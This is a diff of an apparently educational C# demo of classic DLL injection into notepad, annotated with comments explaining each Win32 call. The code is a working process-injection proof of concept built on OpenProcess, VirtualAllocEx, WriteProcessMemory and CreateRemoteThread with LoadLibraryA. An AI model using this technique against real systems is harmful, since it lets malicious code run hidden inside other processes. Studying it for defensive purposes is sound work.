@@ -1,16 +1,12 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading.Tasks;
+using System.Diagnostics;
 
 
 
 namespace dll_injection_demo_csharp
 {
-
     class Program
     {
         [Flags]
@@ -61,7 +57,12 @@ namespace dll_injection_demo_csharp
             WriteCombineModifierflag = 0x400
         }
 
+        // The DLLImport attribute tells the runtime that it should load the unmanaged DLL. The string passed in is the DLL our target function is in
+        // Sometimes you may specify CharSet= which specifies which character set is used for marshalling strings. SetLastError says that the runtime
+        // should capture that error code so the user can retrieve it via Marshal.GetLastWin32Error()
         [DllImport("kernel32.dll", SetLastError = true)]
+        // This defines the managed method that has the exact same signature as the unmanaged one. The declaracterion has the extern keyword, which
+        // tells the runtime this is an external method and that when invoked it can be found in the DLL specified in the DllImport attribute above.
         public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
@@ -69,10 +70,6 @@ namespace dll_injection_demo_csharp
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)
-        {
-            return OpenProcess(flags, false, proc.Id);
-        }
 
         [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
         static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -80,10 +77,16 @@ namespace dll_injection_demo_csharp
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
 
-        [DllImport("kernel32.dll")]
+        [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess,
             IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool IsWow64Process2(
+            IntPtr process,
+            out ushort processMachine,
+            out ushort nativeMachine
+        );
 
         // privileges
         const int PROCESS_CREATE_THREAD = 0x0002;
@@ -97,32 +100,57 @@ namespace dll_injection_demo_csharp
         const uint MEM_RESERVE = 0x00002000;
         const uint PAGE_READWRITE = 4;
 
+        public static bool is64Bit(Process process)
+        {
+            bool ret;
+            ushort processMachine;
+            ushort nativeMachine;
+            IsWow64Process2(process.Handle, out processMachine, out nativeMachine);
+
+            if(processMachine == 0)
+            {
+                // 64 bit application
+                Console.WriteLine("Target process was 64-bit");
+                return true;
+            }
+
+            return false;
+        }
+
         static void Main(string[] args)
         {
-
-
-            Console.WriteLine("Let's inject some DLLs");
-
+            // Classic DLL Injection
             // Technique #1 from https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process 
 
+            //TODO Use traditional malware Win API calls to find pid
             // CreateToolhelp32Snapshot
-
             // Process32First - retrieves information about the first process in the snapshot
-
             // Process32Next - use this in a loop to iterate through them
 
-            // Get our process
-            Process currentProcess = Process.GetCurrentProcess();
+            //TODO Command line args for target process and DLL path
 
-            // OpenProcess - to grab handle to the target process
-            // TODO - Get rid of this bastardization of OpenProcess and just use the pinvoke definition
-            IntPtr hProcess = OpenProcess(currentProcess, ProcessAccessFlags.All);
-
-            // searching for the address of LoadLibraryA and storing it in a pointer
-            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
-
-            // name of the dll we want to inject
+            // Name of the process we want to inject into
+            string targetProcess = "notepad";
+            // Path of the dll we want to inject
             string dllName = "C:\\Users\\andy\\source\\repos\\calc_dll\\Debug\\calc_dll.dll";
+
+            // Return an array of 
+            Console.WriteLine("Attempting to find target process with the following name: " + targetProcess);
+            Process[] localByName = Process.GetProcessesByName(targetProcess);
+
+            if(is64Bit(localByName[0]))
+            {
+                Console.WriteLine("Can't inject a 32-bit DLL into a 64-bit process. Exiting.");
+                System.Environment.Exit(1);
+            }
+
+            Console.WriteLine("Found process with PID: " + localByName[0].Id);
+            // OpenProcess - to grab handle to the target process
+            IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, localByName[0].Id);
+            // searching for the address of LoadLibraryA and storing it in a pointer
+            // GetModuleHandle - returns the baseaddress of kernel32.dll
+            // GetProcAddress - determine the address of LoadLibrary
+            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
 
             // alocating some memory on the target process - enough to store the name of the dll
             // and storing its address in a pointer
@@ -134,7 +162,9 @@ namespace dll_injection_demo_csharp
             WriteProcessMemory(hProcess, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
 
             // CreateRemoteThread, NtCreateThreadEx, or RtlCreateUserThread to execute the code
+            // Creates a thread in the target process, which will execute LoadLibraryA with an arg of allocMemAddress (location where we stored our DLL string)
             // creating a thread that will call LoadLibraryA with allocMemAddress as argument
+            // loadLibraryAddr = Pointer to the application-defined function to be executed by the thread and represents the starting address of the thread in the remote process
             CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
 
             Console.ReadLine();
